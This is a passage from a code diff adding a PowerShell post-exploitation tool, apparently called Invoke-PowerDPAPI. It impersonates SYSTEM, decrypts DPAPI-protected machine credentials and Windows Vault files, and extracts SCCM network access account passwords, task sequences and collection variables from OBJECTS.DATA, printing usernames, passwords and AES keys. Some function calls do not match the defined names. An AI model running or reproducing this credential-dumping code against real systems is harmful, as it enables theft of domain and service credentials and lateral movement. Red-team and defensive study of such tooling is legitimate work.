+        $fs       = [System.IO.FileStream]::new($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
+        $sr       = [System.IO.StreamReader]::new($fs, [System.Text.Encoding]::Default)
+        $fileData = $sr.ReadToEnd()
+        $sr.Close()
+        $fs.Close()
+    }
+    else
+    {
+        Write-Host "`n[!] OBJECTS.DATA does not exist or is not readable`n"
+        return
+    }
+
+    # Define regex patterns to match in OBJECTS.DATA
+    $regexes = @{
+        "networkAccessAccounts" = [regex]::new(
+            'CCM_NetworkAccessAccount.*<PolicySecret Version="1"><!\[CDATA\[(?<NetworkAccessPassword>.*?)\]\]></PolicySecret>.*<PolicySecret Version="1"><!\[CDATA\[(?<NetworkAccessUsername>.*?)\]\]></PolicySecret>',
+            [System.Text.RegularExpressions.RegexOptions]::Multiline -bor
+            [System.Text.RegularExpressions.RegexOptions]::IgnoreCase
+        )
+        "taskSequences" = [regex]::new(
+            '</SWDReserved>.*<PolicySecret Version="1"><!\[CDATA\[(?<TaskSequence>.*?)\]\]></PolicySecret>',
+            [System.Text.RegularExpressions.RegexOptions]::Multiline -bor
+            [System.Text.RegularExpressions.RegexOptions]::IgnoreCase
+        )
+        "collectionVariables" = [regex]::new(
+            'CCM_CollectionVariable\x00\x00(?<CollectionVariableName>.*?)\x00\x00.*<PolicySecret Version="1"><!\[CDATA\[(?<CollectionVariableValue>.*?)\]\]></PolicySecret>',
+            [System.Text.RegularExpressions.RegexOptions]::Multiline -bor
+            [System.Text.RegularExpressions.RegexOptions]::IgnoreCase
+        )
+        "allSecrets" = [regex]::new(
+            '<PolicySecret Version="1"><!\[CDATA\[(?<OtherSecret>.*?)\]\]></PolicySecret>',
+            [System.Text.RegularExpressions.RegexOptions]::Multiline -bor
+            [System.Text.RegularExpressions.RegexOptions]::IgnoreCase
+        )
+    }
+
+    $matches = @{
+        "network access account" = @($regexes["networkAccessAccounts"].Matches($fileData))
+        "task sequence"          = @($regexes["taskSequences"].Matches($fileData))
+        "collection variable"    = @($regexes["collectionVariables"].Matches($fileData))
+        "other"                  = @($regexes["allSecrets"].Matches($fileData))
+    }
+
+    if ($matches["other"].Count -gt 0)
+    {
+        $MasterKeys = Triage-SystemMasterKeys
+        $seenBlobs = @{}
+
+        foreach ($matchKeyValuePair in $matches.GetEnumerator())
+        {
+            if ($matchKeyValuePair.Value.Count -gt 0)
+            {
+                Write-Host "`n[+] Decrypting $($matchKeyValuePair.Value.Count) $($matchKeyValuePair.Key) secrets"
+
+                for ($index = 0; $index -lt $matchKeyValuePair.Value.Count; $index++)
+                {
+                    $match = $matchKeyValuePair.Value[$index]
+                    for ($idxGroup = 1; $idxGroup -lt $match.Groups.Count; $idxGroup++)
+                    {
+                        $groupName  = $match.Groups[$idxGroup].Name
+                        $groupValue = $match.Groups[$idxGroup].Value
+
+                        # Deduplication: skip if this blob has already been processed
+                        # Likely this can stay but should test this on a larger number of machines to ensure we are not skipping data
+                        if ($seenBlobs.ContainsKey($groupValue)) { continue }
+                        $seenBlobs[$groupValue] = $true
+
+                        try
+                        {
+                            if ($groupName -eq "CollectionVariableName")
+                            {
+                                $collectionVariableValue = Decrypt-NAA -Blob $match.Groups[$idxGroup + 1].Value -MasterKeys $MasterKeys
+                                Write-Host "`n    CollectionVariableName:  $groupValue"
+                                Write-Host "    CollectionVariableValue: $collectionVariableValue"
+                            }
+
+                            elseif ($groupName -eq "NetworkAccessPassword")
+                            {
+                                $networkAccessUsername = Decrypt-NAA -Blob $match.Groups[$idxGroup + 1].Value -MasterKeys $MasterKeys
+                                $networkAccessPassword = Decrypt-NAA -Blob $groupValue -MasterKeys $MasterKeys
+                                Write-Host "`n    NetworkAccessUsername: $networkAccessUsername"
+                                Write-Host "    NetworkAccessPassword: $networkAccessPassword"
+                                Write-Host
+                                if ($networkAccessUsername -like "00 00 0E 0E 0E*" -or $networkAccessPassword -like "00 00 0E 0E 0E*")
+                                {
+                                    Write-Host "    [!] At the point in time this secret was downloaded, SCCM was configured to use the client's machine account instead of NAA"
+                                }
+                            }
+
+
+                            elseif ($groupName -eq "CollectionVariableValue" -or $groupName -eq "NetworkAccessUsername")
+                            {
+
+                            }
+
+                            else 
+                            {
+                                $secretPlaintext = Decrypt-NAA -Blob $groupValue -MasterKeys $MasterKeys
+                                $xmlMatch = Select-String -InputObject $secretPlaintext -Pattern "<sequence[^>]*?>.*?</sequence>" -AllMatches
+                                $xmlPrinted = $false
+    
+                                if ($xmlMatch.Matches.Count -gt 0)
+                                {
+                                    
+                                    foreach ($match in $xmlMatch.Matches) 
+                                    {
+                                    
+                                        Write-Host "`n"
+                                        $sequenceXml = [xml]$match.Value
+                                        Format-XML $sequenceXml | Write-Host -ForegroundColor "Gray"
+
+                                        if ($Global:NoSave)
+                                        {
+                                            Continue
+                                        }
+
+                                        else
+                                        {
+                                            $timestamp = Get-Date -Format "yyyy"
+                                            $Random = Get-Random -Minimum 1 -Maximum 10000
+                                            $cleanName = $taskSequence.Name -replace '[^\w\s-]', ''
+                                            $fileName = "TaskSequence_${cleanName}_${timestamp}_${Random}.xml"
+                            
+                                            Start-Sleep -Milliseconds 10
+                                            $sequenceXml.Save((Join-Path -Path $pwd -ChildPath $fileName))
+
+                                            Write-Host "`n"
+                                            Write-Host "[+]    Saved XML to: $fileName"
+                                        }
+                                    }
+                                    
+                                    $xmlPrinted = $true
+                                }
+                            
+                           if (-not $xmlPrinted)
+                            {
+                                # Not sure how needed this is.. At this point this is usually garbage data that only serves to clutter the output
+                                #Write-Host "`n    Plaintext secret: $secretPlaintext"
+                            }
+                           
+                           }
+
+                        }
+                        
+                        catch
+                        {
+                            Write-Host "`n[!] Data was not decrypted (Redacted Output)"
+
+                            $LimitLength = [Math]::Min(100, $groupValue.Length)
+                            Write-Host "$($groupValue.Substring(0, $($LimitLength)))..."
+                            Write-Host "`n"
+                        }
+                    }
+                }
+            }
+        }
+    }
+    else
+    {
+        Write-Host "[!] No policy secrets found"
+    }
+
+    Write-Host "`n"
+}
+
+function Triage-SystemCreds {
+    param([hashtable]$MasterKeys)
+
+    # Orchestrates system credential enumeration and decryption across multiple Windows service profiles.
+    # Hand-off: Calls Triage-CredFolder for each credential location, which triggers Triage-CredFile and Parse-DecCredBlob.
+
+    Write-Host "`n[*] Triaging System Credentials`n"
+
+    $folderLocations = @(
+        "${env:SystemRoot}\System32\config\systemprofile\AppData\Local\Microsoft\Credentials",
+        "${env:SystemRoot}\System32\config\systemprofile\AppData\Roaming\Microsoft\Credentials",
+        "${env:SystemRoot}\ServiceProfiles\LocalService\AppData\Local\Microsoft\Credentials",
+        "${env:SystemRoot}\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Credentials",
+        "${env:SystemRoot}\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Credentials",
+        "${env:SystemRoot}\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\Credentials"
+    )
+
+    foreach ($location in $folderLocations)
+    {
+        if (Test-Path -Path $location -PathType Container)
+        {
+            Write-Host
+            Write-Host "Folder       : $location"
+            Triage-CredFolder -Folder $location -MasterKeys $MasterKeys
+        }
+    }
+}
+
+
+function Triage-CredFile {
+    param ([string] $CredFilePath, [hashtable]$MasterKeys)
+
+    # Processes individual credential files by reading and initiating DPAPI blob decryption.
+    # Hand-off: Calls Describe-Credential with credential file bytes and master keys for decryption.
+
+    $FileName = [System.IO.Path]::GetFileName($CredFilePath)
+    Write-Host "`n"
+    Write-Host "  CredFile           : $FileName"
+    try
+    {
+        $CredentialArray = [System.IO.File]::ReadAllBytes($CredFilePath)
+        Describe-Credential $CredentialArray $MasterKeys
+    }
+    catch
+    {
+        Write-Host "    [!] ERROR processing file: $CredFilePath"
+        Write-Host "        Exception: $($_.Exception.Message)"
+    }
+}
+
+
+function Triage-CredFolder {
+    param ([string]$Folder, [hashtable]$MasterKeys)
+
+    # Enumerates credential files within a specified folder and processes each one.
+    # Hand-off: Calls Triage-CredFile for each credential file found in the target directory.
+
+    if ([string]::IsNullOrEmpty($Folder) -or -not (Test-Path -Path $Folder -PathType Container))
+    {
+        Write-Host "Folder       : $Folder (does not exist or invalid path)"
+        return
+    }
+
+    $SystemFiles = [System.IO.Directory]::GetFiles($Folder)
+    if ($SystemFiles.Length -eq 0)
+    {
+        Write-Host "Folder       : $Folder (no files found)"
+        return
+    }
+
+    foreach ($File in $SystemFiles)
+    {
+        try
+        {
+            Triage-CredFile -CredFilePath $File -MasterKeys $MasterKeys
+        }
+        catch
+        {
+            Write-Host "    [!] ERROR processing file: $File"
+            Write-Host "        Exception: $($_.Exception.Message)"
+        }
+    }
+}
+
+
+function Describe-Credential {
+    param([byte[]]$CredentialBytes, [hashtable]$MasterKeys)
+
+    # Initiates DPAPI blob decryption for credential data and parses the decrypted result.
+    # Hand-off: Calls Describe-DPAPIBlob for decryption, then Parse-DecCredBlob for credential parsing.
+
+    $plaintextBytes = Describe-DPAPIBlob -Blobbytes $CredentialBytes -MasterKeys $MasterKeys -blobType "credential"
+    if ($null -eq $plaintextBytes -or $plaintextBytes.Length -eq 0)
+    {
+        Write-Host "    [X] Decryption failed or returned no data."
+        return
+    }
+    
+    Parse-DecCredBlob -DecBlobBytes $plaintextBytes
+}
+
+function Parse-DecCredBlob {
+    param([byte[]]$DecBlobBytes)
+
+    # Parses decrypted credential blob structure to extract credential metadata and secrets.
+    # Hand-off: Terminal function that outputs credential details including username, target, and password data.
+
+
+    $offset = 0
+    try
+    {
+        $credFlags = [BitConverter]::ToUInt32($DecBlobBytes, $offset)
+        $offset += 4
+        $credSize = [BitConverter]::ToUInt32($DecBlobBytes, $offset)
+        $offset += 4
+        $credUnk0 = [BitConverter]::ToUInt32($DecBlobBytes, $offset)
+        $offset += 4
+        $type = [BitConverter]::ToUInt32($DecBlobBytes, $offset)
+        $offset += 4
+        $flags = [BitConverter]::ToUInt32($DecBlobBytes, $offset)
+        $offset += 4
+
+        $lastWritten = [BitConverter]::ToInt64($DecBlobBytes, $offset)
+        $offset += 8
+        
+        try
+        {
+            $lastWrittenTime = [DateTime]::FromFileTime($lastWritten)
+            $currentDate = Get-Date
+            
+            if (($lastWrittenTime -lt $currentDate.AddYears(-20)) -or 
+                ($lastWrittenTime -gt $currentDate.AddYears(1)))
+            {
+                Write-Host "    [!] Decryption failed, likely incorrect password for the associated masterkey"
+                return
+            }
+        }
+        catch
+        {
+            Write-Host "    [!] Decryption failed, likely incorrect password for the associated masterkey"
+            return
+        }
+
+        $unkFlagsOrSize = [BitConverter]::ToUInt32($DecBlobBytes, $offset)
+        $offset += 4
+        $persist = [BitConverter]::ToUInt32($DecBlobBytes, $offset)
+        $offset += 4
+        $attributeCount = [BitConverter]::ToUInt32($DecBlobBytes, $offset)
+        $offset += 4
+        $unk0 = [BitConverter]::ToUInt32($DecBlobBytes, $offset)
+        $offset += 4
+        $unk1 = [BitConverter]::ToUInt32($DecBlobBytes, $offset)
+        $offset += 4
+
+        $targetNameLen = [BitConverter]::ToInt32($DecBlobBytes, $offset)
+        $offset += 4
+        $targetName = if ($targetNameLen -gt 0 -and $targetNameLen -le ($DecBlobBytes.Length - $offset))
+        {
+            [System.Text.Encoding]::Unicode.GetString($DecBlobBytes, $offset, $targetNameLen)
+        }
+        else { "" }
+        $offset += $targetNameLen
+
+        $targetAliasLen = [BitConverter]::ToInt32($DecBlobBytes, $offset)
+        $offset += 4
+        $targetAlias = if ($targetAliasLen -gt 0 -and $targetAliasLen -le ($DecBlobBytes.Length - $offset))
+        {
+            [System.Text.Encoding]::Unicode.GetString($DecBlobBytes, $offset, $targetAliasLen)
+        }
+        else { "" }
+        $offset += $targetAliasLen
+
+        $commentLen = [BitConverter]::ToInt32($DecBlobBytes, $offset)
+        $offset += 4
+        $comment = if ($commentLen -gt 0 -and $commentLen -le ($DecBlobBytes.Length - $offset))
+        {
+            [System.Text.Encoding]::Unicode.GetString($DecBlobBytes, $offset, $commentLen)
+        }
+        else { "" }
+        $offset += $commentLen
+
+        $unkDataLen = [BitConverter]::ToInt32($DecBlobBytes, $offset)
+        $offset += 4
+        $unkData = if ($unkDataLen -gt 0 -and $unkDataLen -le ($DecBlobBytes.Length - $offset))
+        {
+            [System.Text.Encoding]::Unicode.GetString($DecBlobBytes, $offset, $unkDataLen)
+        }
+        else { "" }
+        $offset += $unkDataLen
+
+        $userNameLen = [BitConverter]::ToInt32($DecBlobBytes, $offset)
+        $offset += 4
+        $userName = if ($userNameLen -gt 0 -and $userNameLen -le ($DecBlobBytes.Length - $offset))
+        {
+            [System.Text.Encoding]::Unicode.GetString($DecBlobBytes, $offset, $userNameLen)
+        }
+        else { "" }
+        $offset += $userNameLen
+
+        $credBlobLen = [BitConverter]::ToInt32($DecBlobBytes, $offset)
+        $offset += 4
+        $credBlobBytes = if ($credBlobLen -gt 0 -and $credBlobLen -le ($DecBlobBytes.Length - $offset))
+        {
+            $tmp = New-Object byte[] $credBlobLen
+            [Array]::Copy($DecBlobBytes, $offset, $tmp, 0, $credBlobLen)
+            $tmp
+        }
+        else { @() }
+        $offset += $credBlobLen
+
+        Write-Host "`n"
+        Write-Host ("    guidMasterKey    : {0}" -f $global:CurrentGuidMasterKey)
+        Write-Host ("    size             : {0}" -f $credSize)
+        Write-Host ("    flags            : 0x{0:X8} (CRYPTPROTECT_SYSTEM)" -f $credFlags)
+        Write-Host ("    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)")
+        Write-Host ("    description      : Local Credential Data")
+        Write-Host ("    LastWritten      : {0}" -f $lastWrittenTime)
+        Write-Host ("    TargetName       : {0}" -f $targetName.Trim())
+        Write-Host ("    TargetAlias      : {0}" -f $targetAlias.Trim())
+        Write-Host ("    Comment          : {0}" -f $comment.Trim())
+        Write-Host ("    UserName         : {0}" -f $userName.Trim())
+        
+        if ($credBlobBytes.Length -gt 0)
+        {
+            if (Is-Unicode $credBlobBytes)
+            {
+                $credBlob = [System.Text.Encoding]::Unicode.GetString($credBlobBytes)
+                Write-Host ("    Credential       : {0}" -f $credBlob.Trim())
+            }
+            else
+            {
+                $credBlobByteString = ($credBlobBytes | ForEach-Object { "{0:X2}" -f $_ }) -join " "
+                Write-Host ("    Credential       : {0}" -f $credBlobByteString.Trim())
+            }
+        }
+        else
+        {
+            Write-Host ("    Credential       :")
+        }
+
+       Write-Host "`n"
+    }
+    catch
+    {
+        Write-Host "    [!] Error parsing decrypted credential blob: $($_.Exception.Message)"
+    }
+}
+
+
+function AES-Decrypt {
+    param ([byte[]] $key, [byte[]] $IV, [byte[]] $data)
+
+    $aesCryptoProvider = [System.Security.Cryptography.AesManaged]::new()
+    $aesCryptoProvider.Key = $key
+
+    if ($IV.Length -ne 0)
+    {
+        $aesCryptoProvider.IV = $IV
+    }
+
+    $aesCryptoProvider.Mode = [Security.Cryptography.CipherMode]::CBC
+
+    $plaintextBytes = $aesCryptoProvider.CreateDecryptor().TransformBlock($data, 0, $data.Length)
+
+    return $plaintextBytes
+}
+
+function Parse-DecPolicyBlob {
+    param ([byte[]]$decBlobBytes)
+
+    function Find-ArrayIndex {
+        param ([byte[]]$array, [byte[]]$pattern, [int]$startIndex = 0)
+
+        for ($i = $startIndex; $i -le $array.Length - $pattern.Length; $i++)
+        {
+            $found = $true
+            for ($j = 0; $j -lt $pattern.Length; $j++)
+            {
+                if ($array[$i + $j] -ne $pattern[$j])
+                {
+                    $found = $false
+                    break
+                }
+            }
+            if ($found)
+            {
+                return $i
+            }
+        }
+        return -1
+    }
+
+    $keys = @()
+    $s = [System.Text.Encoding]::ASCII.GetString($decBlobBytes, 12, 4)
+
+    if ($s -eq 'KDBM')
+    {
+        $offset = 20
+
+        $aes128len = [BitConverter]::ToInt32($decBlobBytes, $offset)
+        $offset += 4
+
+        if ($aes128len -ne 16)
+        {
+            Write-Warning "Error parsing decrypted Policy.vpol (aes128len != 16)"
+            return $keys
+        }
+
+        $aes128Key = $decBlobBytes[$offset..($offset + $aes128len - 1)]
+        $offset += $aes128len
+
+        $offset += 20
+
+        $aes256len = [BitConverter]::ToInt32($decBlobBytes, $offset)
+        $offset += 4
+
+        if ($aes256len -ne 32)
+        {
+            Write-Warning "Error parsing decrypted Policy.vpol (aes256len != 32)"
+            return $keys
+        }
+
+        $aes256Key = $decBlobBytes[$offset..($offset + $aes256len - 1)]
+
+        $keys += ,$aes128Key
+        $keys += ,$aes256Key
+    }
+    else
+    {
+        $offset = 16
+        $s2 = [System.Text.Encoding]::ASCII.GetString($decBlobBytes, $offset, 4)
+        $offset += 4
+
+        if ($s2 -eq 'KSSM')
+        {
+            $offset += 16
+
+            $aes128len = [BitConverter]::ToInt32($decBlobBytes, $offset)
+            $offset += 4
+
+            if ($aes128len -ne 16)
+            {
+                Write-Warning "Error parsing decrypted Policy.vpol (aes128len != 16)"
+                return $keys
+            }
+
+            $aes128Key = $decBlobBytes[$offset..($offset + $aes128len - 1)]
+            $offset += $aes128len
+
+            $pattern = 0x4b,0x53,0x53,0x4d,0x02,0x00,0x01,0x00,0x01,0x00,0x00,0x00
+            $index = Find-ArrayIndex -array $decBlobBytes -pattern $pattern -startIndex $offset
+
+            if ($index -ne -1)
+            {
+                $offset = $index + 20
+
+                $aes256len = [BitConverter]::ToInt32($decBlobBytes, $offset)
+                $offset += 4
+
+                if ($aes256len -ne 32)
+                {
+                    Write-Warning "Error parsing decrypted Policy.vpol (aes256len != 32)"
+                    return $keys
+                }
+
+                $aes256Key = $decBlobBytes[$offset..($offset + $aes256len - 1)]
+
+                $keys += ,$aes128Key
+                $keys += ,$aes256Key
+            }
+            else
+            {
+                Write-Warning "Error in decrypting Policy.vpol: second MSSK header not found!"
+            }
+        }
+    }
+
+    return $keys
+}
+
+
+
+function Describe-VaultPolicy {
+    param([byte[]]$PolicyBytes, [hashtable]$MasterKeys)
+
+    # Decrypts Windows Vault policy files to extract AES encryption keys for vault credential decryption.
+    # Hand-off: Calls Describe-DPAPIBlob for policy decryption, then Parse-DecPolicyBlob for key extraction.
+
+    $offset = 0
+
+    $version = [BitConverter]::ToInt32($PolicyBytes, $offset)
+    $offset += 4
+
+    $vaultIDbytes = $PolicyBytes[$offset..($offset+15)]
+    $vaultID = [Guid]::New([byte[]]$vaultIDbytes)
+    $offset += 16
+
+    Write-Host "`n  VaultID            : $vaultID"
+
+    $nameLen = [BitConverter]::ToInt32($PolicyBytes, $offset)
+    $offset += 4
+    $name = [System.Text.Encoding]::Unicode.GetString($PolicyBytes, $offset, $nameLen)
+    $offset += $nameLen
+    Write-Host "  Name               : $name"
+
+    # skip unk0/unk1/unk2
+    $offset += 12
+
+    $keyLen = [BitConverter]::ToInt32($PolicyBytes, $offset)
+    $offset += 4
+
+    # skip unk0/unk1 GUIDs
+    $offset += 32
+
+    $keyBlobLen = [BitConverter]::ToInt32($PolicyBytes, $offset)
+    $offset += 4
+
+    $blobBytes = $PolicyBytes[$offset..($offset + $keyBlobLen - 1)]
+    $offset += $keyBlobLen
+
+    $plaintextBytes = Describe-DPAPIBlob -blobBytes $blobBytes -MasterKeys $MasterKeys -Type "policy"
+
+    if ($plaintextBytes -and $plaintextBytes.Length -gt 0) {
+        $keys = Parse-DecPolicyBlob -decBlobBytes $plaintextBytes
+
+        if ($keys.Count -eq 2) {
+            Write-Host ("    guidMasterKey    : {0}" -f $global:CurrentGuidMasterKey)
+            Write-Host ("    size             : {0}" -f $blobBytes.Length)
+            Write-Host ("    flags            : 0x{0:X8} (CRYPTPROTECT_SYSTEM)" -f 0x20000000)
+            Write-Host ("    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)")
+            Write-Host ("    description      : Vault Policy Key")
+            
+            $aes128KeyStr = [BitConverter]::ToString($keys[0]).Replace("-", "")
+            Write-Host "    aes128 key       : $aes128KeyStr"
+            
+            $aes256KeyStr = [BitConverter]::ToString($keys[1]).Replace("-", "")
+            Write-Host "    aes256 key       : $aes256KeyStr"
+            
+            return $keys
+        } 
+        else {
+            Write-Host "    [!] Error parsing decrypted Policy.vpol (AES keys not extracted, likely incorrect password for the associated masterkey)"
+            return @()
+        }
+    } 
+    else {
+        Write-Host "    [!] Failed to decrypt Policy.vpol"
+        return @()
+    }
+}
+
+function Describe-VaultItem {
+    param([byte[]]$VaultItemBytes)
+
+    # Parses decrypted vault item structure to extract credential properties and values.
+    # Hand-off: Terminal function that outputs vault credential details including resource, identity, and authenticator.
+
+    $offset = 0
+    $version = [BitConverter]::ToInt32($VaultItemBytes, $offset)
+    $offset += 4
+    $count = [BitConverter]::ToInt32($VaultItemBytes, $offset)
+    $offset += 4
+    $offset += 4 # skip unk
+
+    for ($i = 0; $i -lt $count; ++$i) {
+        $id = [BitConverter]::ToInt32($VaultItemBytes, $offset)
+        $offset += 4
+        $size = [BitConverter]::ToInt32($VaultItemBytes, $offset)
+        $offset += 4
+        $entryString = [System.Text.Encoding]::Unicode.GetString($VaultItemBytes, $offset, $size)
+        $entryData = $VaultItemBytes[$offset..($offset + $size - 1)]
+        $offset += $size
+
+        switch ($id) {
+            1 { Write-Host "    Resource         : $entryString" }
+            2 { Write-Host "    Identity         : $entryString" }
+            3 { Write-Host "    Authenticator    : $entryString" }
+            default {
+                if (Is-Unicode -Data $entryData) {
+                    Write-Host "    Property $id     : $entryString"
+                } else {
+                    $entryDataString = ($entryData | ForEach-Object { "{0:X2}" -f $_ }) -join ' '
+                    Write-Host "    Property $id     : $entryDataString"
+                }
+            }
+        }
+    }
+}
+
+
+function Describe-VaultCred {
+    param([byte[]]$VaultBytes,[array]$AESKeys)
+
+    # Decrypts Windows Vault credential files using extracted AES keys from vault policy.
+    # Hand-off: Calls AESDecrypt for credential decryption, then Describe-VaultItem for credential parsing.
+
+    $aes128key = $AESKeys[0]
+    $aes256key = $AESKeys[1]
+
+    $offset = 0
+    $finalAttributeOffset = 0
+
+    # skip schema GUID
+    $offset += 16
+
+    $unk0 = [BitConverter]::ToInt32($VaultBytes, $offset)
+    $offset += 4
+
+    $lastWritten = [BitConverter]::ToInt64($VaultBytes, $offset)
+    $offset += 8
+    $lastWrittenTime = [DateTime]::FromFileTime($lastWritten)
+    Write-Host "`n    LastWritten      : $lastWrittenTime"
+
+    # skip unk1/unk2
+    $offset += 8
+
+    $friendlyNameLen = [BitConverter]::ToInt32($VaultBytes, $offset)
+    $offset += 4
+    $friendlyName = [System.Text.Encoding]::Unicode.GetString($VaultBytes, $offset, $friendlyNameLen)
+    $offset += $friendlyNameLen
+    Write-Host "    FriendlyName     : $friendlyName"
+
+    $attributeMapLen = [BitConverter]::ToInt32($VaultBytes, $offset)
+    $offset += 4
+
+    $numberOfAttributes = [math]::Floor($attributeMapLen / 12)
+    $attributeMap = @{}
+
+    for ($i = 0; $i -lt $numberOfAttributes; ++$i) {
+        $attributeNum = [BitConverter]::ToInt32($VaultBytes, $offset)
+        $offset += 4
+        $attributeOffset = [BitConverter]::ToInt32($VaultBytes, $offset)
+        $offset += 8 # skip unk
+        $attributeMap[$attributeNum] = $attributeOffset
+    }
+
+    $leftover = $VaultBytes[222..($VaultBytes.Length - 1)]
+
+    foreach ($attribute in $attributeMap.GetEnumerator()) {
+        $attributeOffset = $attribute.Value + 16
+
+        if ($attribute.Key -ge 100) {
+            $attributeOffset += 4
+        }
+
+        $dataLen = [BitConverter]::ToInt32($VaultBytes, $attributeOffset)
+        $attributeOffset += 4
+
+        $finalAttributeOffset = $attributeOffset
+
+        if ($dataLen -gt 0) {
+            $IVPresent = [BitConverter]::ToBoolean($VaultBytes, $attributeOffset)
+            $attributeOffset += 1
+
+            if (-not $IVPresent) {
+                $dataBytes = $VaultBytes[$attributeOffset..($attributeOffset + $dataLen - 2)]
+                $finalAttributeOffset = $attributeOffset + $dataLen - 1
+                # You must implement AESDecrypt
+                $decBytes = AESDecrypt -Key $aes128key -IV @() -Data $dataBytes
+            } else {
+                $IVLen = [BitConverter]::ToInt32($VaultBytes, $attributeOffset)
+                $attributeOffset += 4
+                $IVBytes = $VaultBytes[$attributeOffset..($attributeOffset + $IVLen - 1)]
+                $attributeOffset += $IVLen
+                $dataBytes = $VaultBytes[$attributeOffset..($attributeOffset + $dataLen - 1 - 4 - $IVLen)]
+                $attributeOffset += $dataLen - 1 - 4 - $IVLen
+                $finalAttributeOffset = $attributeOffset
+                $decBytes = AESDecrypt -Key $aes256key -IV $IVBytes -Data $dataBytes
+                Describe-VaultItem -VaultItemBytes $decBytes
+            }
+        }
+    }
+
+    if (($numberOfAttributes -gt 0) -and ($unk0 -lt 4)) {
+        $clearOffset = $finalAttributeOffset - 2
+        $clearBytes = $VaultBytes[$clearOffset..($VaultBytes.Length - 1)]
+
+        $cleatOffSet2 = 0
+        $cleatOffSet2 += 4 # skip ID
+
+        $dataLen = [BitConverter]::ToInt32($clearBytes, $cleatOffSet2)
+        $cleatOffSet2 += 4
+
+        if ($dataLen -gt 2000) {
+            Write-Host "    [*] Vault credential clear attribute is > 2000 bytes, skipping..."
+        } elseif ($dataLen -gt 0) {
+            $IVPresent = [BitConverter]::ToBoolean($VaultBytes, $cleatOffSet2)
+            $cleatOffSet2 += 1
+
+            if (-not $IVPresent) {
+                $dataBytes = $clearBytes[$cleatOffSet2..($cleatOffSet2 + $dataLen - 2)]
+                $decBytes = AESDecrypt -Key $aes128key -IV @() -Data $dataBytes
+            } else {
+                $IVLen = [BitConverter]::ToInt32($clearBytes, $cleatOffSet2)
+                $cleatOffSet2 += 4
+                $IVBytes = $clearBytes[$cleatOffSet2..($cleatOffSet2 + $IVLen - 1)]
+                $cleatOffSet2 += $IVLen
+                $dataBytes = $clearBytes[$cleatOffSet2..($cleatOffSet2 + $dataLen - 1 - 4 - $IVLen)]
+                $cleatOffSet2 += $dataLen - 1 - 4 - $IVLen
+                $decBytes = AESDecrypt -Key $aes256key -IV $IVBytes -Data $dataBytes
+                Describe-VaultItem -VaultItemBytes $decBytes
+            }
+        }
+    }
+}
+
+
+function Triage-SystemVaults {
+    param([hashtable]$MasterKeys)
+
+    # Orchestrates Windows Vault enumeration and decryption across system service profiles.
+    # Hand-off: Calls Triage-VaultFolder for each vault directory containing Policy.vpol files.
+
+    Write-Host "`n[*] Triaging SYSTEM Vaults`n"
+
+    $folderLocations = @(
+        "${env:SystemRoot}\System32\config\systemprofile\AppData\Local\Microsoft\Vault",
+        "${env:SystemRoot}\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault",
+        "${env:SystemRoot}\ServiceProfiles\LocalService\AppData\Local\Microsoft\Vault",
+        "${env:SystemRoot}\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Vault",
+        "${env:SystemRoot}\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Vault",
+        "${env:SystemRoot}\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\Vault"
+    )
+
+    foreach ($location in $folderLocations) {
+        if (-not (Test-Path -Path $location -PathType Container)) { 
+            continue 
+        }
+
+        $vaultDirs = Get-ChildItem -Path $location -Directory | 
+                     Select-Object -ExpandProperty FullName
+
+        foreach ($vaultDir in $vaultDirs) {
+            $dirName = Split-Path $vaultDir -Leaf
+            if ($dirName -match '^[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}$') {
+                Triage-VaultFolder -Folder $vaultDir -MasterKeys $MasterKeys
+            }
+        }
+    }
+}
+
+
+
+function Triage-VaultFolder {
+    param ([string]$Folder, [hashtable]$MasterKeys)
+
+    # Processes Windows Vault policy files and credential files within a vault directory.
+    # Hand-off: Calls Describe-VaultPolicy for policy decryption, then Describe-VaultCred for each credential file.
+
+    $PolicyFilePath = "$Folder\Policy.vpol"
+
+    if (-not ([System.IO.File]::Exists($PolicyFilePath))) {
+        return
+    }
+
+    Write-Host "[*] Triaging Vault Folder: $Folder"
+
+    $PolicyBytes = [System.IO.File]::ReadAllBytes($PolicyFilePath)
+
+    $keys = Describe-VaultPolicy $PolicyBytes $MasterKeys
+
+    if ($keys.Count -eq 0) {
+        return
+    }
+
+    $VaultCredFiles = [System.IO.Directory]::GetFiles($Folder)
+
+    if ($VaultCredFiles -eq $null -or $VaultCredFiles.Length -eq 0) {
+        return
+    }
+
+    foreach ($VaultCredFile in $VaultCredFiles) {
+        $FileName = [System.IO.Path]::GetFileName($VaultCredFile)
+
+        if (-not ($FileName.EndsWith("vcrd"))) {
+            continue
+        }
+
+        try {
+            $vaultCredBytes = [System.IO.File]::ReadAllBytes($VaultCredFile)
+            Describe-VaultCred $vaultCredBytes $keys
+        }
+        
+        catch {
+            Write-Host "ERROR"
+        }
+    }
+}
+
+
+
+function Invoke-PowerDPAPI {
+    param ([string]$Command, [switch]$SaveTS)
+
+    # Capture all output (including Write-Host) in a variable
+    $output = & {
+        
+        Write-Host "`n"
+
+        $Impersonate = Invoke-Impersonate
+        if (-not $Impersonate)
+        {
+            Write-Host "[!] Unable to elevate"
+            return
+        }
+
+        try {
+            
+            if ($SaveTS)
+            { 
+                $global:NoSave = $false
+            }
+            else
+            {
+                $global:NoSave = $true
+            }
+
+            switch ($Command) {
+                
+                "MachineTriage" {
+                    
+                    $MasterKeys = Triage-SystemMasterKeys
+                    Triage-SystemCreds -MasterKeys $MasterKeys
+                    Triage-SystemVaults -MasterKeys $MasterKeys
+                }
+                
+                "MachineVaults" {
+                    
+                    $MasterKeys = Triage-SystemMasterKeys
+                    Triage-SystemVaults -MasterKeys $MasterKeys
+                }
+                
+                "MachineCredentials" {
+                    
+                    $MasterKeys = Triage-SystemMasterKeys
+                    Triage-SystemCreds -MasterKeys $MasterKeys
+                }
+                
+                "SCCM" {
+                    
+                    $MasterKeys = Triage-SystemMasterKeys
+                    Triage-SccmWMI -MasterKeys $MasterKeys
